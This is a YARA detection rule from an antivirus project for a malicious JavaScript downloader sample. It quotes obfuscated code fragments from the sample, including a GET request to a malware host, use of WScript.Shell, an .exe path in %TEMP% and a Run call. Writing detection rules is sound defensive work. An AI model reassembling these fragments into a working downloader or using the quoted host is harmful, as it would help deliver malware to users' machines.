rule sig_20160330_8cdcf6c482d88591adad1313f5613ca0 {
  meta:
    description = "datamaliciousorder - file 20160330_8cdcf6c482d88591adad1313f5613ca0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8c20690f7032ab9843093869d0173671db6a1f1a9caee1e219c729c4cff6e46f"

  strings:
    $s1  = "BK[CJ](\"GET\", \"http://be-stlines-tore.com/k3soa\", false);" fullword ascii
    $s2  = "var WA = function CK() {return WScript[UR](\"WScript\"+\".Shell\");}(), MN = 11;" fullword ascii
    $s3  = "function BS(UZ, TO){O = O * 1; return UZ - TO;};" fullword ascii
    $s4  = "if (BK[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function H() {return WA[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"lxneMxcsi0Qf.ex\" + \"e\";};" fullword ascii
    $s6  = "function JR(){return F0 + \"\";};" fullword ascii
    $s7  = "function C() {return ((VM == true) && (VM == OA)) ? 1 : O;};" fullword ascii
    $s8  = "function VG(LP){WA[\"Run\"](LP, O, O);};" fullword ascii
    $s9  = "}while (J);" fullword ascii
    $s10 = "var T0 = new this[\"Date\"]();" fullword ascii
    $s11 = "function GS(){return 22;};" fullword ascii
    $s12 = "function C0(NY) {var ZH = (1, 2, 3, 4, 5, NY); return ZH;};" fullword ascii
    $s13 = "return BS(VX, CF);" fullword ascii
    $s14 = "function F(){return UR;};" fullword ascii
    $s15 = "function BA()" fullword ascii
    $s16 = "VM = true; " fullword ascii
    $s17 = "var VM = false;" fullword ascii
    $s18 = "OA = true; " fullword ascii
    $s19 = "var OA = false;" fullword ascii
    $s20 = "} catch(PW){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}